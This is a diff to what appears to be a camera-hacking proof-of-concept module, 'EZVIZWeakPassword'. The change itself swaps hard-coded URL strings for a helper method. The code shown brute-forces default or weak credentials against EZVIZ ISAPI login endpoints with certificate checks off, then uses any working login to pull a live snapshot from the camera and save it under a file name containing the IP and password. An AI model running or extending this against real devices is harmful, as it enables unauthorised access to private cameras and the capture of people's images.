@@ -16,7 +16,7 @@ class EZVIZWeakPassword(POCTemplate):
         headers = {"User-Agent": self.config.user_agent}
         for user in self.config.users:
             for password in self.config.passwords:
-                url = f"http://{ip}:{port}/ISAPI/Security/userCheck"
+                url = self.url(ip, port, "/ISAPI/Security/userCheck")
                 try:
                     r = self.session.get(url, headers=headers, auth=(user, password),
                                          timeout=self.config.timeout, verify=False)
@@ -30,7 +30,7 @@ class EZVIZWeakPassword(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul = results
         return self._snapshot(
-            f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture",
+            self.url(ip, port, "/ISAPI/Streaming/channels/101/picture"),
             f"{ip}-{port}-{user}-{password}-ezviz.jpg",
             auth=(user, password))
 
